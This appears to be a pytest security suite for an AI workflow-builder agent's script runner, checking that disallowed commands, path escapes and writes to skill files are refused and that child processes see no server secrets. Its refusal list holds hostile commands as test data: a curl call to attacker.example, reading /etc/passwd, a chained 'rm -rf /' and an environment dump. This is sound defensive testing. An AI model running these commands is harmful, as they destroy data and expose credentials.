"""Security: what the builder agent can make the Script_Runner and the file tools do.

Validates: Requirements 20.7, 34.8, 35.12, 36.4, 49.7.

* Refused scripts, refused modes and path escapes: the call returns a reason as the tool
  result, starts no subprocess, leaves the sandbox as it was, and shows no server path.
* Environment: a real child process that prints ``os.environ`` sees only the allow-listed
  names, never the database URL, cloud credentials, tokens or signing keys the server
  holds.
* Writes under ``/skills/`` are refused at each layer (the tool middleware, the file
  backend) and in a whole Turn, and the deployed skill files do not change.

The refusal tests use ``FakeProcessFactory``, so a started process would show up in
``factory.starts``. The environment test starts one real interpreter through the real
``spawn_process``: the child runs a stub file in place of the skill script, with the
flags, working directory and environment the runner built. The write tests copy the
skill package to ``tmp_path``, so a failure cannot damage the checked-in copy.

No Docker, no database and no network.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import os
import shutil
import subprocess
import sys
from collections.abc import Mapping, Sequence
from pathlib import Path
from typing import Any

import pytest
from langchain.agents.middleware.types import ToolCallRequest
from langchain_core.messages import ToolMessage

from app.agents.workflow_builder.backend_fs import (
    SKILL_READ_ONLY_MESSAGE,
    build_builder_backend,
)
from app.agents.workflow_builder.middleware import BuilderToolObserverMiddleware
from app.agents.workflow_builder.sandbox import BuilderSandbox
from app.agents.workflow_builder.script_policy import BUILDER_SKILL_ID
from app.agents.workflow_builder.script_runner import (
    ProcessLike,
    ScriptContext,
    ScriptResult,
    run_command,
    spawn_process,
)
from tests.fakes.builder_gate import FakeGate
from tests.fakes.builder_turn import FakeTurnPort
from tests.fakes.process_factory import FakeProcessFactory
from tests.fakes.scripted_chat_model import ModelTurn, ScriptedToolCall
from tests.security.builder_turn_harness import BACKEND_SKILLS_ROOT, run_scripted_turn

SKILL = f"/skills/{BUILDER_SKILL_ID}"
SCRIPTS = f"python {SKILL}/scripts"
MANIFEST = "/workflows/a.workflow.json"
BACKEND_COPY = BACKEND_SKILLS_ROOT / BUILDER_SKILL_ID

#: Server-held values that must never reach a script (Requirement 36.4).
CANARY = "CANARY-5d2e8c"
SERVER_SECRETS = {
    "DATABASE_URL": f"postgresql://user:{CANARY}@db/app",
    "AWS_ACCESS_KEY_ID": f"AKIA{CANARY}",
    "AWS_SECRET_ACCESS_KEY": CANARY,
    "AWS_SESSION_TOKEN": CANARY,
    "COGNITO_CLIENT_SECRET": CANARY,
    "JWT_SIGNING_KEY": CANARY,
    "ANTHROPIC_API_KEY": CANARY,
    "OPENAI_API_KEY": CANARY,
    "GITHUB_TOKEN": CANARY,
    "PYTHONPATH": f"/{CANARY}",
    "PYTHONSTARTUP": f"/{CANARY}/startup.py",
    "HTTPS_PROXY": f"http://{CANARY}:3128",
    "SOME_FUTURE_SECRET": CANARY,
}

#: The names a script may see (Requirement 36.3), written out here on purpose: the test
#: does not import the runner's own constant, so a name added there fails this test.
ALLOWED_ENV_NAMES = frozenset(
    {
        "PATH",
        "PYTHONDONTWRITEBYTECODE",
        "PYTHONIOENCODING",
        "PYTHONUTF8",
        "PYTHONNOUSERSITE",
        "TMP",
        "TEMP",
        "TMPDIR",
        "HOME",
        "USERPROFILE",
        "LANG",
        "SYSTEMROOT",
        "PATHEXT",
    }
)

#: ``(id, command)``. Each must be refused with a reason and start no process.
REFUSED_SCRIPTS = [
    ("unknown-script", f"{SCRIPTS}/evil.py"),
    ("script-in-sandbox", "python /workflows/a.workflow.json"),
    ("script-outside-skill", "python ../../outside.py"),
    ("inline-code", 'python -c "import os; print(os.environ)"'),
    ("interpreter-module", "python -m http.server"),
    ("not-python-bash", "bash -c 'cat /etc/passwd'"),
    ("not-python-curl", "curl http://attacker.example/x"),
    ("chain-semicolon", f"{SCRIPTS}/catalog_lookup.py overview; rm -rf /"),
    ("chain-and", f"{SCRIPTS}/catalog_lookup.py overview && echo done"),
    ("pipe", f"{SCRIPTS}/catalog_lookup.py overview | cat"),
    ("redirect", f"{SCRIPTS}/catalog_lookup.py overview > /workflows/out.txt"),
]
REFUSED_MODES = [
    ("refresh-without-check", f"{SCRIPTS}/refresh_catalog.py"),
    ("refresh-source", f"{SCRIPTS}/refresh_catalog.py --check --source /tmp/x"),
    ("refresh-api", f"{SCRIPTS}/refresh_catalog.py --check --api"),
    ("refresh-render", f"{SCRIPTS}/refresh_catalog.py --check --render"),
    ("schema-sync-without-check", f"{SCRIPTS}/schema_sync.py"),
    ("schema-sync-source", f"{SCRIPTS}/schema_sync.py --check --source /tmp/x"),
    ("selftest-compiler", f"{SCRIPTS}/selftest.py --compiler"),
    ("selftest-catalog", f"{SCRIPTS}/selftest.py --catalog /tmp/c.json"),
    ("lookup-catalog", f"{SCRIPTS}/catalog_lookup.py overview --catalog /tmp/c.json"),
    ("lookup-schema", f"{SCRIPTS}/catalog_lookup.py overview --schema /tmp/s.json"),
    ("validate-catalog", f"{SCRIPTS}/validate_manifest.py {MANIFEST} --catalog /tmp/c"),
    ("validate-schema", f"{SCRIPTS}/validate_manifest.py {MANIFEST} --schema /tmp/s"),
]
REFUSED_PATHS = [
    ("validate-climbs-out", f"{SCRIPTS}/validate_manifest.py ../../../outside.json"),
    (
        "validate-climbs-out-backslash",
        f"{SCRIPTS}/validate_manifest.py ..\\..\\outside.json",
    ),
    (
        "validate-climbs-from-workflows",
        f"{SCRIPTS}/validate_manifest.py /workflows/../../outside.json",
    ),
    ("validate-input-in-skill", f"{SCRIPTS}/validate_manifest.py {SKILL}/SKILL.md"),
    (
        "validate-input-in-skill-repo-path",
        f"{SCRIPTS}/validate_manifest.py app/agents/workflow_builder/skills/{BUILDER_SKILL_ID}/SKILL.md",
    ),
    ("export-input-climbs-out", f"{SCRIPTS}/export_manifest.py ../../outside.json"),
    (
        "export-output-climbs-out",
        f"{SCRIPTS}/export_manifest.py {MANIFEST} --save-payload ../../outside.json",
    ),
    (
        "export-output-into-skill",
        f"{SCRIPTS}/export_manifest.py {MANIFEST} --save-payload {SKILL}/payload.json",
    ),
]


# --- Helpers ----------------------------------------------------------------------------


def _listing(root: Path) -> list[str]:
    return sorted(p.relative_to(root).as_posix() for p in root.rglob("*"))


def _digest(root: Path) -> str:
    """One digest of every file name and byte under ``root``."""
    hasher = hashlib.sha256()
    for path in sorted(p for p in root.rglob("*") if p.is_file()):
        hasher.update(path.relative_to(root).as_posix().encode())
        hasher.update(path.read_bytes())
    return hasher.hexdigest()


def _context(
    sandbox: BuilderSandbox,
    skill_root: Path,
    *,
    spawn: Any,
    results: list[ScriptResult] | None = None,
    call_id: str = "call-1",
) -> ScriptContext:
    return ScriptContext(
        sandbox=sandbox,
        skill_root=skill_root,
        gate=FakeGate(),
        turn=FakeTurnPort(),
        semaphore=asyncio.Semaphore(2),
        spawn=spawn,
        call_id=call_id,
        on_finished=(lambda _cid, result: results.append(result))
        if results is not None
        else None,
    )


@pytest.fixture
def sandbox(tmp_path: Path) -> BuilderSandbox:
    box = BuilderSandbox("user-1", "session-1", root=tmp_path / "builder")
    box.ensure()
    box.path_for(MANIFEST).write_text('{"steps": []}', encoding="utf-8")
    return box


# --- Refused scripts, modes and paths -----------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        pytest.param(command, id=case_id)
        for case_id, command in REFUSED_SCRIPTS + REFUSED_MODES + REFUSED_PATHS
    ],
)
async def test_run_command_returns_a_reason_and_starts_nothing_when_command_is_refused(
    command: str, sandbox: BuilderSandbox, tmp_path: Path
) -> None:
    factory = FakeProcessFactory()
    results: list[ScriptResult] = []
    ctx = _context(sandbox, BACKEND_COPY, spawn=factory, results=results)
    before = _listing(sandbox.path)

    result = await run_command(command, ctx)

    assert result.status == "refused"
    assert result.exit_code is None
    assert result.text.strip(), "a refusal must carry a reason"
    assert factory.starts == [], "a refused call started a process"
    assert _listing(sandbox.path) == before, "a refused call changed the sandbox"
    assert [r.status for r in results] == ["refused"]
    # No server path in the reason (Requirement 42.5).
    assert str(tmp_path) not in result.text
    assert str(BACKEND_SKILLS_ROOT) not in result.text


@pytest.mark.parametrize(
    ("command", "alternative"),
    [
        (f"{SCRIPTS}/refresh_catalog.py", "catalog_lookup.py"),
        (f"{SCRIPTS}/schema_sync.py", "--check"),
    ],
    ids=["refresh-names-the-read-script", "schema-sync-names-check"],
)
async def test_run_command_names_the_allowed_alternative_when_refused_mode_has_one(
    command: str, alternative: str, sandbox: BuilderSandbox
) -> None:
    ctx = _context(sandbox, BACKEND_COPY, spawn=FakeProcessFactory())

    result = await run_command(command, ctx)

    assert result.status == "refused"
    assert alternative in result.text


async def test_run_command_starts_one_process_when_command_is_allowed(
    sandbox: BuilderSandbox,
) -> None:
    factory = FakeProcessFactory()
    ctx = _context(sandbox, BACKEND_COPY, spawn=factory)

    result = await run_command(
        f"{SCRIPTS}/catalog_lookup.py overview --trust user", ctx
    )

    assert result.status == "ok"
    assert len(factory.starts) == 1


# --- Environment seen by a child ---------------------------------------------------------


_ENV_STUB = """\
import json, os
print(json.dumps(dict(os.environ)))
"""


class _StubSpawner:
    """The real ``spawn_process``, with the script file swapped for a stub.

    The runner builds ``[python, -B, -s, -X, utf8, <script>, *args]``. The stub takes the
    script's place; flags, arguments, working directory and environment are the runner's.
    """

    def __init__(self, stub: Path) -> None:
        self._stub = stub

    async def __call__(
        self, argv: Sequence[str], *, cwd: Path, env: Mapping[str, str]
    ) -> ProcessLike:
        args = list(argv)
        args[5] = str(self._stub)
        return await spawn_process(args, cwd=cwd, env=env)


def _platform_injected_names() -> frozenset[str]:
    """Names the platform adds to any child process, whatever the parent passes.

    Some Windows endpoint-security agents add variables to every new process. They are
    not the server's secrets. A bare interpreter shows which names those are.
    """
    bare = {"SYSTEMROOT": os.environ["SYSTEMROOT"]} if sys.platform == "win32" else {}
    done = subprocess.run(
        [sys.executable, "-c", "import json, os; print(json.dumps(list(os.environ)))"],
        capture_output=True,
        env=bare,
        text=True,
        timeout=60,
        check=True,
    )
    return frozenset(name.upper() for name in json.loads(done.stdout))


async def test_run_command_gives_child_only_allow_listed_names_when_server_holds_secrets(
    sandbox: BuilderSandbox, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    for name, value in SERVER_SECRETS.items():
        monkeypatch.setenv(name, value)
    for name in ("HOME", "USERPROFILE", "TMPDIR", "LANG"):
        monkeypatch.setenv(name, f"/{CANARY}/{name.lower()}")
    stub = tmp_path / "print_environment.py"
    stub.write_text(_ENV_STUB, encoding="utf-8")
    ctx = _context(sandbox, BACKEND_COPY, spawn=_StubSpawner(stub), call_id="call-env")

    result = await run_command(f"{SCRIPTS}/catalog_lookup.py overview", ctx)

    assert result.status == "ok", result.text
    dumped = result.text.split("\n", 2)[2]
    seen = {name.upper(): value for name, value in json.loads(dumped).items()}
    assert set(seen) <= ALLOWED_ENV_NAMES | _platform_injected_names()
    assert not set(SERVER_SECRETS) & set(seen), "a server secret reached the child"
    assert all(CANARY not in value for value in seen.values()), "a server value leaked"
    assert seen["PYTHONDONTWRITEBYTECODE"] == "1"
    assert seen["PYTHONIOENCODING"] == "utf-8"
    assert seen["TMP"] == seen["TEMP"] == seen["TMPDIR"]
    assert Path(seen["TMP"]).name == "call-env"


# --- Writes under /skills/ ---------------------------------------------------------------


@pytest.fixture
def skills_copy(tmp_path: Path) -> Path:
    """A throwaway copy of the skill package, so a write that got through is harmless."""
    target = tmp_path / "skills_copy"
    shutil.copytree(
        BACKEND_SKILLS_ROOT, target, ignore=shutil.ignore_patterns("__pycache__")
    )
    return target


def _tool_request(name: str, args: dict[str, Any]) -> ToolCallRequest:
    return ToolCallRequest(
        tool_call={"name": name, "args": args, "id": "call-1", "type": "tool_call"},
        tool=None,
        state={},
        runtime=None,  # type: ignore[arg-type]
    )


@pytest.mark.parametrize("tool", ["write_file", "edit_file"])
@pytest.mark.parametrize(
    "path",
    [
        f"{SKILL}/SKILL.md",
        f"{SKILL}/scripts/catalog_lookup.py",
        "/skills",
        "/skills/new.md",
        "//skills/x",
        "/workflows/../skills/x",
        "\\skills\\x",
        "skills/x",
    ],
)
async def test_tool_middleware_refuses_write_without_running_the_tool_when_path_is_under_skills(
    tool: str, path: str
) -> None:
    ran: list[str] = []

    async def handler(request: ToolCallRequest) -> ToolMessage:
        ran.append(request.tool_call["name"])
        return ToolMessage(content="written", tool_call_id="call-1")

    middleware = BuilderToolObserverMiddleware(FakeTurnPort())

    result = await middleware.awrap_tool_call(
        _tool_request(tool, {"file_path": path, "content": "pwned"}), handler
    )

    assert ran == [], "the write tool ran"
    assert isinstance(result, ToolMessage)
    assert result.content == SKILL_READ_ONLY_MESSAGE


def test_file_backend_refuses_write_edit_and_upload_when_target_is_a_skill_file(
    tmp_path: Path, skills_copy: Path
) -> None:
    sandbox_root = tmp_path / "sandbox"
    sandbox_root.mkdir()
    backend = build_builder_backend(sandbox_root, skills_copy, [BUILDER_SKILL_ID])
    before = _digest(skills_copy)
    target = f"{SKILL}/SKILL.md"

    written = backend.write(target, "pwned")
    edited = backend.edit(target, "a", "b")
    created = backend.write(f"{SKILL}/new.md", "pwned")
    uploaded = backend.upload_files([(f"{SKILL}/up.md", b"pwned")])

    assert written.error == SKILL_READ_ONLY_MESSAGE
    assert edited.error == SKILL_READ_ONLY_MESSAGE
    assert created.error == SKILL_READ_ONLY_MESSAGE
    assert all(item.error for item in uploaded)
    assert _digest(skills_copy) == before, "a deployed skill file changed"
    assert _listing(sandbox_root) == [], "a refused write landed in the sandbox"


async def test_run_turn_refuses_agent_writes_under_skills_when_model_tries_them(
    tmp_path: Path, skills_copy: Path
) -> None:
    before = _digest(skills_copy)
    skill_md = f"{SKILL}/SKILL.md"

    run = await run_scripted_turn(
        tmp_path=tmp_path,
        model_turns=(
            ModelTurn(
                tool_calls=(
                    ScriptedToolCall(
                        "write_file", {"file_path": skill_md, "content": "pwned"}
                    ),
                )
            ),
            ModelTurn(
                tool_calls=(
                    ScriptedToolCall(
                        "edit_file",
                        {
                            "file_path": skill_md,
                            "old_string": "#",
                            "new_string": "# pwned",
                        },
                    ),
                )
            ),
            ModelTurn(text=("I could not change the skill.",)),
        ),
        canvas_state={"steps": []},
        skills_root=skills_copy,
    )

    assert _digest(skills_copy) == before, "a deployed skill file changed"
    refusals = [
        message
        for message in run.model.calls[-1]
        if isinstance(message, ToolMessage)
        and message.content == SKILL_READ_ONLY_MESSAGE
    ]
    assert len(refusals) == 2, "both writes should come back as the read-only refusal"
    assert not (run.sandbox.path / "skills").exists()
